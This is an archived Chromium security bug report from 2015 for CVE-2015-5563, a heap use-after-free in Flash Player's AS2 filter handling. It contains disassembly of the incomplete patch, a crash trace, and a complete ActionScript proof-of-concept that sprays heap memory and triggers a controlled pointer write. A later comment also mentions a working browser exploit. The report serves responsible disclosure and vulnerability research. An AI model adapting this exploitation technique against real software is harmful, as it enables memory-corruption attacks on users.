# Security: Flash Heap-use-after-free in SurfaceFilterList::C​reateFromScriptAtom. Alwayzzzzzzz

| Field | Value |
|-------|-------|
| **Issue ID** | [40082454](https://issues.chromium.org/issues/40082454) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **CVE IDs** | CVE-2015-5563 |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-07-08 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

Copy Paste of <https://crbug.com/chromium/480496>

**VERSION**  

Chrome Version: N/A yet, Flash 18.0.0.203  

Operating System: [Win7 x64 SP1]

**REPRODUCTION CASE**

Flash 18.0.0.203 patched <https://crbug.com/chromium/480496> by checking if the internal filter object is still alive after the first Array.length call (from Flash player standalone):

.text:004D71DA loc\_4D71DA:  

.text:004D71DA and ecx, 0FFFFFFF8h  

.text:004D71DD call xAS2\_getArrayLength  

.text:004D71E2 test eax, eax  

.text:004D71E4 jle short loc\_4D725D  

.text:004D71E6 mov ecx, [esp+8+arg\_C]  

.text:004D71EA mov eax, [ecx+94h]  

.text:004D71F0 test eax, 0FFFFFFFEh  

.text:004D71F5 jz short loc\_4D7200  

.text:004D71F7 and eax, 0FFFFFFFEh  

.text:004D71FA cmp dword ptr [eax+28h], 0 ; here we check whether the object has been deleted or not  

.text:004D71FE jnz short loc\_4D720B  

.text:004D7200  

.text:004D7200 loc\_4D7200:  

.text:004D7200 mov ecx, dword\_E51A40  

.text:004D7206 call sub\_968A00 ; and in that case we suicide

Unfortunately they forget to do that check after the second Array.length call:

.text:004D721D loc\_4D721D:  

.text:004D721D and eax, 0FFFFFFF8h  

.text:004D7220 push edi  

.text:004D7221 mov edi, eax  

.text:004D7223 mov ecx, edi  

.text:004D7225 xor esi, esi  

.text:004D7227 call xAS2\_getArrayLength ; here we can still execute a script and delete the filters...  

.text:004D722C test eax, eax  

.text:004D722E jle short loc\_4D725C

Should crash that way:  

CPU Disasm  

Address Hex dump Command Comments  

004CE27F 8B51 04 MOV EDX,DWORD PTR DS:[ECX+4]  

004CE282 8942 04 MOV DWORD PTR DS:[EDX+4],EAX ; write a pointer to 0x41424344  

004CE285 8B51 04 MOV EDX,DWORD PTR DS:[ECX+4]  

004CE288 8950 08 MOV DWORD PTR DS:[EAX+8],EDX  

004CE28B FF41 08 INC DWORD PTR DS:[ECX+8]  

004CE28E 8941 04 MOV DWORD PTR DS:[ECX+4],EAX  

004CE291 C2 0400 RETN 4  

004CE294 FF41 08 INC DWORD PTR DS:[ECX+8]

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of flash\_as2\_filters\_uaf\_write4\_poc.fla  

//Compile that with Flash CS5.5 and change the property "s" in the swf to "4"  

//It's because Flash CS5.5 does not allow naming a property with a numeral

import flash.filters.GlowFilter;

var tfield:TextField = createTextField("tf",1,1,2,3,4)  

var a1:Array = new Array()  

var a2:Array = new Array()  

for (i = 0; i<0x3F8/4;i++) {  

a2[i] = 0x41424344  

}  

a2[3] = 0  

a2[0x324/4] = 0x41424344  

a2[0x324/4 + 1] = 0x41424344  

a2[0x324/4 + 2] = 0x41414143  

a2[0x324/4 + 3] = 0x41414100  

for (var i = 0; i<0x200;i++) {  

var tf:TextFormat = new TextFormat()  

a1[i] = tf  

}  

for (var i = 0; i<0x100;i++) {  

a1[i].tabStops = a2  

}  

a1[0xFF].tabStops = []

function f() {

```
_global.mc.createTextField("tf",1,1,2,3,4)  

```

a1[0xFE].tabStops = []  

a1[0xFD].tabStops = []  

for (var i = 0x100; i<0x200;i++) {  

\_global.a1[i].tabStops = \_global.a2  

}  

}

\_global.mc = this  

\_global.counter = 0  

\_global.a1 = a1  

\_global.a2 = a2

var oCounter:Object = new Object()  

oCounter.valueOf = function () {  

\_global.counter += 1  

if (\_global.counter == 4) f()  

return 10;  

}

var o = {length:oCounter, s:new GlowFilter(1,2,3,4,5,6,true,true)}  

tfield.filters = o

## Attachments

- [as2filtersUAFbis.zip](attachments/as2filtersUAFbis.zip) (application/zip, 13.7 KB)

## Timeline

### bi...@gmail.com (2015-07-08)

For Scarybeasts and Natashenka

### bi...@gmail.com (2015-07-08)

[Comment Deleted]

### bi...@gmail.com (2015-07-08)

[Comment Deleted]

### bi...@gmail.com (2015-07-08)

Exploit when Natashenka confirms she did not do an alnighter and has not already reported that bug :S


### in...@chromium.org (2015-07-08)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-07-08)

[Empty comment from Monorail migration]

### na...@google.com (2015-07-09)

Nope, this is a new(ish) issue, not filed by PZ yet.

### bi...@gmail.com (2015-07-09)

Browse as2_filters_uaf.html with Chrome stable 43.0.2357.132. With --no-sandbox :P.

### na...@google.com (2015-07-17)

This is PSIRT-3937

### bi...@gmail.com (2015-08-20)

Fixed in https://helpx.adobe.com/security/products/flash-player/apsb15-19.html, CVE-2015-5563

### ti...@google.com (2015-08-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-08-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-08-30)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-09)

Last but not least - $7500 for this report. Congratulations again.

### ti...@google.com (2015-10-16)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-29)

Payment is on its way - should arrive in ~7 days. Thanks again for your report!

### cl...@chromium.org (2015-12-02)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/508072?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082454)*
